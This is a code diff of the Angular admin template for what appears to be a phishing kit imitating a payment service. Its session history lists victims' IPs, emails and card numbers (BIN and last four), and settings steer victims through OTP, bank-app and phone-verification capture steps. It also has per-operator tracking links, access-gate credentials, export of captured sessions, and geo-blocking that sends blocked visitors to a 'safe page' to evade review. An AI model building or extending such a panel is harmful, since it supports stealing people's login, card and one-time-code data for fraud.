@@ -566,10 +341,10 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                             </td>
                                             <td class="px-4 py-3 text-right flex justify-end items-center gap-3">
                                                 <button (click)="copy(getLinkUrl(link.code))" class="text-pp-blue hover:underline text-[10px] font-bold flex items-center gap-1">
-                                                    <span class="material-icons text-xs">content_copy</span> Copy
+                                                    <span class="material-icons text-xs">content_copy</span> {{ 'COPY' | translate }}
                                                 </button>
                                                 @if(isDefaultLink(link.code)) {
-                                                    <span class="text-[9px] uppercase font-bold bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">Default</span>
+                                                    <span class="text-[9px] uppercase font-bold bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">{{ 'DEFAULT' | translate }}</span>
                                                 } @else {
                                                     <button (click)="deleteLink(link.code)" class="text-red-500 hover:text-red-700 text-[10px] font-bold flex items-center gap-1">
                                                         <span class="material-icons text-xs">delete</span>
@@ -591,38 +366,59 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- SYSTEM TAB (Hypervisor) -->
+                <!-- SYSTEM TAB -->
                 @case ('system') {
                     <div class="h-full overflow-y-auto p-6 space-y-6">
 
                         <!-- KPI Stats -->
                         <div class="grid grid-cols-4 gap-4">
                             <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
-                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">Total Sessions</p>
+                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'TOTAL_SESSIONS' | translate }}</p>
                                 <p class="text-2xl font-bold text-pp-navy dark:text-white mt-1">{{ kpiStats().total }}</p>
                             </div>
                             <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
-                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">Active Now</p>
+                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'ACTIVE_NOW' | translate }}</p>
                                 <p class="text-2xl font-bold text-pp-blue mt-1">{{ kpiStats().active }}</p>
                             </div>
                             <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
-                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">Verified</p>
+                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'VERIFIED' | translate }}</p>
                                 <p class="text-2xl font-bold text-green-600 mt-1">{{ kpiStats().verified }}</p>
                             </div>
                             <div class="bg-white dark:bg-slate-800 p-4 rounded-xl border border-slate-100 dark:border-slate-700 shadow-sm">
-                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">Link Clicks</p>
+                                <p class="text-xs font-bold text-slate-400 uppercase tracking-wider">{{ 'LINK_CLICKS' | translate }}</p>
                                 <p class="text-2xl font-bold text-slate-600 dark:text-slate-300 mt-1">{{ kpiStats().clicks }}</p>
                             </div>
                         </div>
 
-                        <!-- Live Console -->
+                        <!-- Gate Configuration -->
+                        <div class="bg-white dark:bg-slate-800 rounded-xl shadow-sm border border-slate-100 dark:border-slate-700 p-6">
+                            <h3 class="font-bold text-sm text-pp-navy dark:text-white uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">{{ 'ACCESS_CONTROL' | translate }}</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="gateUser" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'GATE_USER' | translate }}</label>
+                                </div>
+                                <div class="pp-input-group mb-0">
+                                    <input type="text" [(ngModel)]="gatePass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                    <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'GATE_PASSWORD' | translate }}</label>
+                                </div>
+                            </div>
+                            <div class="mt-4 flex justify-end">
+                                <button (click)="saveGateSettings()" class="bg-slate-900 text-white px-4 py-2 rounded-lg font-bold text-xs uppercase hover:bg-slate-800 transition-colors">
+                                    {{ 'UPDATE_CREDENTIALS' | translate }}
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Logs -->
                         <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[400px]">
+                            <!-- Server Logs -->
                             <div class="bg-[#1e1e1e] rounded-xl overflow-hidden flex flex-col shadow-lg border border-slate-700">
                                 <div class="bg-[#2d2d2d] px-4 py-2 border-b border-slate-600 flex justify-between items-center">
                                     <span class="text-xs font-bold text-slate-300 uppercase flex items-center gap-2">
-                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> Live Server Logs
+                                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> {{ 'LIVE_SERVER_LOGS' | translate }}
                                     </span>
-                                    <button (click)="systemLogs.set([])" class="text-[10px] text-slate-400 hover:text-white uppercase font-bold">Clear</button>
+                                    <button (click)="systemLogs.set([])" class="text-[10px] text-slate-400 hover:text-white uppercase font-bold">{{ 'CLEAR' | translate }}</button>
                                 </div>
                                 <div class="flex-1 overflow-y-auto p-4 font-mono text-xs space-y-1">
                                     @for(log of systemLogs(); track log.timestamp) {
@@ -631,16 +427,13 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                             <span [class.text-red-400]="log.type === 'error'" [class.text-green-400]="log.type === 'log'" class="break-all">{{ log.msg }}</span>
                                         </div>
                                     }
-                                    @if(systemLogs().length === 0) {
-                                        <div class="text-slate-600 italic">Waiting for logs...</div>
-                                    }
                                 </div>
                             </div>
 
-                            <!-- Audit Log -->
+                            <!-- Audit Logs -->
                             <div class="bg-white dark:bg-slate-800 rounded-xl overflow-hidden flex flex-col shadow-sm border border-slate-100 dark:border-slate-700">
                                 <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50">
-                                    <h3 class="font-bold text-pp-navy dark:text-white">Audit Log</h3>
+                                    <h3 class="font-bold text-pp-navy dark:text-white">{{ 'AUDIT_LOG' | translate }}</h3>
                                 </div>
                                 <div class="flex-1 overflow-y-auto">
                                     <table class="w-full text-left text-xs">
@@ -671,13 +464,13 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     </div>
                 }
 
-                <!-- USERS TAB (Hypervisor) -->
+                <!-- USERS TAB -->
                 @case ('users') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col p-6">
                         <div class="flex justify-between items-center mb-6">
                             <h2 class="font-bold text-xl text-pp-navy dark:text-white">Admin Management</h2>
                             <button (click)="openAddUserModal()" class="bg-pp-blue text-white px-4 py-2 rounded-lg font-bold text-xs flex items-center gap-2 hover:bg-[#005ea6] transition-colors">
-                                <span class="material-icons text-sm">add</span> Create Admin
+                                <span class="material-icons text-sm">add</span> {{ 'CREATE_ADMIN' | translate }}
                             </button>
                         </div>
 
@@ -685,17 +478,17 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                             <table class="w-full text-left border-collapse">
                                 <thead class="bg-slate-50 dark:bg-slate-900 text-slate-500 text-xs font-bold uppercase">
                                     <tr>
-                                        <th class="px-4 py-3 rounded-l-lg">Username</th>
-                                        <th class="px-4 py-3">Role</th>
+                                        <th class="px-4 py-3 rounded-l-lg">{{ 'USERNAME' | translate }}</th>
+                                        <th class="px-4 py-3">{{ 'ROLE' | translate }}</th>
                                         <th class="px-4 py-3">Personal Link</th>
                                         <th class="px-4 py-3">Limits</th>
-                                        <th class="px-4 py-3 text-right rounded-r-lg">Actions</th>
+                                        <th class="px-4 py-3 text-right rounded-r-lg">{{ 'ACTIONS' | translate }}</th>
                                     </tr>
                                 </thead>
                                 <tbody class="text-sm font-medium text-pp-navy dark:text-white divide-y divide-slate-100 dark:divide-slate-700">
                                     @for(u of userList(); track u.id) {
-                                        <tr>
-                                            <td class="px-4 py-3">{{ u.username }}</td>
+                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors cursor-pointer" (click)="viewAdminDetails(u)">
+                                            <td class="px-4 py-3 font-bold text-pp-blue">{{ u.username }}</td>
                                             <td class="px-4 py-3">
                                                 <span class="px-2 py-1 rounded text-[10px] font-bold uppercase"
                                                       [class.bg-red-100]="u.role === 'hypervisor'" [class.text-red-700]="u.role === 'hypervisor'"
@@ -707,39 +500,17 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                 /?id={{ u.uniqueCode }}
                                             </td>
                                             <td class="px-4 py-3 font-mono text-xs">
-                                                <div class="flex flex-col gap-1">
-                                                    <div class="flex items-center gap-2">
-                                                        <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded">{{ u.maxLinks || 1 }} Links</span>
-                                                        @if(u.role !== 'hypervisor') {
-                                                            <button (click)="updateUserMaxLinks(u)" class="text-pp-blue hover:underline text-[10px] font-bold">Limit</button>
-                                                        }
-                                                    </div>
-                                                    <div class="flex items-center gap-2">
-                                                        <span class="px-2 py-0.5 rounded text-[9px] font-bold uppercase" [class.bg-green-100]="!u.isSuspended" [class.text-green-700]="!u.isSuspended" [class.bg-red-100]="u.isSuspended" [class.text-red-700]="u.isSuspended">
-                                                            {{ u.isSuspended ? 'SUSPENDED' : 'ACTIVE' }}
-                                                        </span>
-                                                        @if(u.role !== 'hypervisor') {
-                                                            <button (click)="toggleSuspension(u)" class="text-pp-blue hover:underline text-[10px] font-bold">
-                                                                {{ u.isSuspended ? 'Unsuspend' : 'Suspend' }}
-                                                            </button>
-                                                        }
-                                                    </div>
+                                                <div class="flex items-center gap-2">
+                                                    <span class="bg-slate-100 dark:bg-slate-700 px-2 py-0.5 rounded">{{ u.maxLinks || 1 }} Links</span>
+                                                    <span class="px-2 py-0.5 rounded text-[9px] font-bold uppercase" [class.bg-green-100]="!u.isSuspended" [class.text-green-700]="!u.isSuspended" [class.bg-red-100]="u.isSuspended" [class.text-red-700]="u.isSuspended">
+                                                        {{ u.isSuspended ? 'SUSPENDED' : 'ACTIVE' }}
+                                                    </span>
                                                 </div>
                                             </td>
-                                            <td class="px-4 py-3 text-right flex justify-end items-center gap-2">
-                                                @if(u.id !== auth.currentUser()?.id) {
-                                                    <button (click)="impersonateUser(u)" class="text-xs bg-slate-100 hover:bg-slate-200 dark:bg-slate-700 dark:hover:bg-slate-600 px-2 py-1 rounded text-pp-navy dark:text-white font-bold transition-colors" title="Impersonate">
-                                                        Log in as
-                                                    </button>
-                                                    <button (click)="resetUserPassword(u)" class="p-1 text-slate-400 hover:text-pp-blue transition-colors" title="Reset Password">
-                                                        <span class="material-icons text-sm">lock_reset</span>
-                                                    </button>
-                                                    <button (click)="deleteUser(u)" class="p-1 text-slate-400 hover:text-red-500 transition-colors" title="Delete User">
-                                                        <span class="material-icons text-sm">delete</span>
-                                                    </button>
-                                                } @else {
-                                                    <span class="text-xs text-slate-400 italic">Current</span>
-                                                }
+                                            <td class="px-4 py-3 text-right">
+                                                <button class="text-slate-400 hover:text-pp-blue transition-colors">
+                                                    <span class="material-icons text-sm">chevron_right</span>
+                                                </button>
                                             </td>
                                         </tr>
                                     }
@@ -752,64 +523,19 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 <!-- HISTORY TAB -->
                 @case ('history') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
-
-                        <!-- Toolbar -->
                         <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
-                            <h3 class="font-bold text-lg text-pp-navy dark:text-white shrink-0 hidden md:block">Session History</h3>
-
-                            <div class="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
-                                <!-- Bulk Actions -->
-                                @if(selectedSessionIds().size > 0) {
-                                    <div class="flex items-center bg-pp-navy dark:bg-slate-600 text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
-                                        <span class="text-xs font-bold px-2">{{ selectedSessionIds().size }} selected</span>
-                                        <div class="h-4 w-px bg-white/20 mx-1"></div>
-                                        <button (click)="bulkExport()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Export Selected"><span class="material-icons text-sm">download</span></button>
-                                        <button (click)="bulkPin()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Pin Selected"><span class="material-icons text-sm">push_pin</span></button>
-                                        <button (click)="bulkDelete()" class="p-1.5 hover:bg-red-500 rounded transition-colors" title="Delete Selected"><span class="material-icons text-sm">delete</span></button>
-                                    </div>
-                                }
-
-                                <!-- Filters -->
-                                <div class="flex items-center gap-2 w-full md:w-auto">
-                                    <div class="relative flex-1 md:w-64">
-                                        <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
-                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg focus:outline-none focus:border-pp-blue transition-colors dark:bg-slate-700 dark:text-white">
-                                    </div>
-
-                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
-                                        <option value="6h">Last 6 Hours</option>
-                                        <option value="24h">Last 24 Hours</option>
-                                        <option value="7d">Last 7 Days</option>
-                                        <option value="all">All Time</option>
-                                        <option value="custom">Custom Range</option>
-                                    </select>
-
-                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
-                                        <option value="all">All Countries</option>
-                                        @for(c of uniqueCountries(); track c) {
-                                            <option [value]="c">{{ c }}</option>
-                                        }
-                                    </select>
-
-                                    <select [ngModel]="statusFilter()" (ngModelChange)="statusFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
-                                        <option value="all">All Status</option>
-                                        <option value="verified">Verified</option>
-                                        <option value="incomplete">Incomplete</option>
-                                    </select>
+                            <h3 class="font-bold text-lg text-pp-navy dark:text-white shrink-0 hidden md:block">{{ 'HISTORY' | translate }}</h3>
+                            <div class="flex items-center gap-2 w-full md:w-auto ml-auto">
+                                <div class="relative flex-1 md:w-64">
+                                    <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
+                                    <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg focus:outline-none focus:border-pp-blue transition-colors dark:bg-slate-700 dark:text-white">
                                 </div>
+                                <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white">
+                                    <option value="24h">24h</option>
+                                    <option value="all">All</option>
+                                </select>
                             </div>
                         </div>
-
-                        <!-- Custom Date Range (Conditional) -->
-                        @if(timeFilter() === 'custom') {
-                            <div class="px-6 py-3 bg-slate-100 dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 flex items-center justify-end gap-3 animate-fade-in">
-                                <span class="text-xs font-bold text-slate-500 uppercase">Range:</span>
-                                <input type="date" [ngModel]="customDateStart()" (ngModelChange)="customDateStart.set($event)" class="px-2 py-1 text-sm border border-slate-300 dark:border-slate-600 rounded dark:bg-slate-700 dark:text-white">
-                                <span class="text-slate-400">-</span>
-                                <input type="date" [ngModel]="customDateEnd()" (ngModelChange)="customDateEnd.set($event)" class="px-2 py-1 text-sm border border-slate-300 dark:border-slate-600 rounded dark:bg-slate-700 dark:text-white">
-                            </div>
-                        }
-
                         <div class="flex-1 overflow-auto bg-white dark:bg-slate-800">
                             <table class="w-full text-left border-collapse">
                                 <thead class="bg-pp-bg dark:bg-slate-800 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
@@ -820,65 +546,21 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                         <th class="px-4 py-4">Time</th>
                                         <th class="px-6 py-4">IP Address</th>
                                         <th class="px-6 py-4">Identity</th>
-                                        <th class="px-6 py-4">Card Info</th>
                                         <th class="px-6 py-4">Status</th>
                                         <th class="px-6 py-4 text-right">Actions</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-100 dark:divide-slate-700 text-sm font-medium">
                                     @for(item of filteredHistory(); track item.id) {
-                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700 transition-colors cursor-pointer group" (click)="viewHistory(item)"
-                                            [class.bg-blue-50]="selectedSessionIds().has(item.id)"
-                                            [class.dark:bg-slate-700]="selectedSessionIds().has(item.id)">
+                                        <tr class="hover:bg-slate-50 dark:hover:bg-slate-700 transition-colors cursor-pointer group" (click)="viewHistory(item)">
                                             <td class="px-4 py-4 text-center" (click)="$event.stopPropagation()">
                                                 <input type="checkbox" [checked]="selectedSessionIds().has(item.id)" (change)="toggleSelection(item.id, $event)" class="rounded border-slate-300 dark:border-slate-500 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                             </td>
                                             <td class="px-4 py-4 text-slate-500 dark:text-slate-400 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
-                                            <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">
-                                                {{ item.ip || item.fingerprint.ip }}
-                                                @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue dark:text-blue-400 ml-1">push_pin</span> }
-                                            </td>
-                                            <td class="px-6 py-4">
-                                                <div class="flex flex-col">
-                                                    <div class="flex items-center gap-2">
-                                                        <span class="font-bold text-pp-navy dark:text-white">{{ item.name }}</span>
-                                                        @if(item.data?.ipCountry) {
-                                                            <img [src]="getFlagUrl(item.data.ipCountry)" class="h-3 w-auto rounded-[2px]" title="{{item.data.ipCountry}}">
-                                                        }
-                                                    </div>
-                                                    <span class="text-xs text-slate-400">{{ item.email }}</span>
-                                                </div>
-                                            </td>
-                                            <td class="px-6 py-4 font-mono text-slate-600 dark:text-slate-300">
-                                                <div class="flex items-center gap-2">
-                                                    @if(getCardLogoUrl(item.data?.cardType)) {
-                                                        <img [src]="getCardLogoUrl(item.data.cardType)" class="h-4 w-auto object-contain">
-                                                    }
-                                                    <span>{{ item.data.cardBin }}...{{ item.data.cardLast4 }}</span>
-                                                </div>
-                                            </td>
-                                            <td class="px-6 py-4">
-                                                @if(item.data?.isArchivedIncomplete) {
-                                                    <span class="bg-slate-100 dark:bg-slate-600 text-slate-600 dark:text-slate-300 px-3 py-1 rounded-full text-[11px] font-bold uppercase">INCOMPLETE</span>
-                                                } @else {
-                                                    <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
-                                                }
-                                            </td>
-                                            <td class="px-6 py-4 text-right" (click)="$event.stopPropagation()">
-                                                <div class="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
-                                                    <button (click)="exportTxt(item)" class="text-slate-400 hover:text-pp-blue transition-colors" title="Export TXT"><span class="material-icons text-lg">download</span></button>
-                                                    <button (click)="pinSession(item)" [class.text-pp-blue]="item.isPinned" [class.text-slate-400]="!item.isPinned" class="hover:text-pp-blue transition-colors" title="Pin"><span class="material-icons text-lg">push_pin</span></button>
-                                                    <button (click)="deleteSession(item)" class="text-slate-400 hover:text-red-600 transition-colors" title="Delete"><span class="material-icons text-lg">delete</span></button>
-                                                </div>
-                                            </td>
-                                        </tr>
-                                    }
-                                    @if(filteredHistory().length === 0) {
-                                        <tr>
-                                            <td colspan="7" class="px-6 py-12 text-center text-slate-400">
-                                                <span class="material-icons text-4xl mb-2 opacity-20">search_off</span>
-                                                <p>No sessions found matching your filters.</p>
-                                            </td>
+                                            <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">{{ item.ip || item.fingerprint.ip }}</td>
+                                            <td class="px-6 py-4 dark:text-white">{{ item.email }}</td>
+                                            <td class="px-6 py-4"><span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span></td>
+                                            <td class="px-6 py-4 text-right"><button (click)="exportTxt(item)" class="text-pp-blue font-bold text-xs hover:underline">Export</button></td>
                                         </tr>
                                     }
                                 </tbody>
@@ -890,15 +572,15 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 <!-- SETTINGS TAB -->
                 @case ('settings') {
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-y-auto h-full p-8 animate-fade-in">
-                         <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">System Configuration</h2>
+                         <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">{{ 'SYSTEM' | translate }} Configuration</h2>
 
                          <!-- Flow Customization -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
-                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Traffic Flow</h3>
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TRAFFIC_FLOW' | translate }}</h3>
                              <div class="space-y-4">
                                  <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                      <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Auto-Approve Login</span>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'AUTO_APPROVE_LOGIN' | translate }}</span>
                                          <span class="text-xs text-slate-400">Automatically bypass login and go to verification</span>
                                      </div>
                                      <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
@@ -910,7 +592,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  </label>
                                  <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                      <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Phone Verification</span>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'SKIP_PHONE_VERIFICATION' | translate }}</span>
                                          <span class="text-xs text-slate-400">Jump directly to Personal Info</span>
                                      </div>
                                      <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
@@ -922,8 +604,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  </label>
                                  <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                      <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Force Bank App</span>
-                                         <span class="text-xs text-slate-400">Require App verification instead of SMS</span>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'FORCE_BANK_APP' | translate }}</span>
                                      </div>
                                      <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                           [class.bg-pp-success]="flowSettings.forceBankApp" [class.bg-slate-200]="!flowSettings.forceBankApp"
@@ -934,8 +615,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  </label>
                                  <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                                      <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Force OTP</span>
-                                         <span class="text-xs text-slate-400">Require OTP even if App flow is selected</span>
+                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">{{ 'FORCE_OTP' | translate }}</span>
                                      </div>
                                      <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
                                           [class.bg-pp-success]="flowSettings.forceOtp" [class.bg-slate-200]="!flowSettings.forceOtp"
@@ -944,55 +624,94 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                                [class.translate-x-5]="flowSettings.forceOtp" [class.translate-x-0]="!flowSettings.forceOtp"></span>
                                      </div>
                                  </label>
-                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
-                                     <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Card Verification</span>
-                                         <span class="text-xs text-slate-400">Skip card input step entirely</span>
-                                     </div>
-                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
-                                          [class.bg-pp-success]="flowSettings.skipCard" [class.bg-slate-200]="!flowSettings.skipCard"
-                                          (click)="flowSettings.skipCard = !flowSettings.skipCard; $event.preventDefault()">
-                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
-                                               [class.translate-x-5]="flowSettings.skipCard" [class.translate-x-0]="!flowSettings.skipCard"></span>
-                                     </div>
-                                 </label>
-                                 <label class="flex items-center justify-between cursor-pointer p-3 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
-                                     <div>
-                                         <span class="text-sm font-bold text-pp-navy dark:text-white block">Skip Bank Verification</span>
-                                         <span class="text-xs text-slate-400">Skip OTP/App verification steps</span>
-                                     </div>
-                                     <div class="relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none"
-                                          [class.bg-pp-success]="flowSettings.skipBank" [class.bg-slate-200]="!flowSettings.skipBank"
-                                          (click)="flowSettings.skipBank = !flowSettings.skipBank; $event.preventDefault()">
-                                         <span class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out"
-                                               [class.translate-x-5]="flowSettings.skipBank" [class.translate-x-0]="!flowSettings.skipBank"></span>
-                                     </div>
-                                 </label>
+                             </div>
+                         </div>
 
-                                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
-                                     <div class="pp-input-group mb-0">
-                                         <input type="number" [(ngModel)]="flowSettings.autoApproveDelay" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                         <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Auto-Approve Delay (ms)</label>
+                         <!-- Geo-Blocking (NEW) -->
+                         <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'GEO_BLOCKING' | translate }}</h3>
+
+                             <div class="space-y-6">
+                                 <div>
+                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'ALLOWED_COUNTRIES' | translate }} (Whitelist)</label>
+                                     <p class="text-xs text-slate-400 mb-2">Only users from these countries can access the page. Leave empty to allow all.</p>
+                                     <div class="flex flex-wrap gap-2 mb-2">
+                                         @for(c of flowSettings.allowedCountries; track c) {
+                                             <span class="bg-green-100 text-green-800 text-xs font-bold px-2 py-1 rounded flex items-center gap-1">
+                                                 {{ c }}
+                                                 <button (click)="removeCountry('allowed', c)" class="hover:text-green-900"><span class="material-icons text-[10px]">close</span></button>
+                                             </span>
+                                         }
                                      </div>
-                                     <div class="pp-input-group mb-0">
-                                         <input type="text" [(ngModel)]="flowSettings.redirectUrl" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                         <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Success Redirect URL</label>
+                                     <div class="flex gap-2">
+                                         <select #allowSelect class="pp-input py-1 text-sm dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                             <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
+                                         </select>
+                                         <button (click)="addCountry('allowed', allowSelect.value)" class="pp-btn w-auto px-4 py-1 text-xs">Add</button>
                                      </div>
                                  </div>
+
+                                 <div>
+                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'BLOCKED_COUNTRIES' | translate }} (Blacklist)</label>
+                                     <p class="text-xs text-slate-400 mb-2">Users from these countries will be redirected to the safe page.</p>
+                                     <div class="flex flex-wrap gap-2 mb-2">
+                                         @for(c of flowSettings.blockedCountries; track c) {
+                                             <span class="bg-red-100 text-red-800 text-xs font-bold px-2 py-1 rounded flex items-center gap-1">
+                                                 {{ c }}
+                                                 <button (click)="removeCountry('blocked', c)" class="hover:text-red-900"><span class="material-icons text-[10px]">close</span></button>
+                                             </span>
+                                         }
+                                     </div>
+                                     <div class="flex gap-2">
+                                         <select #blockSelect class="pp-input py-1 text-sm dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                             <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
+                                         </select>
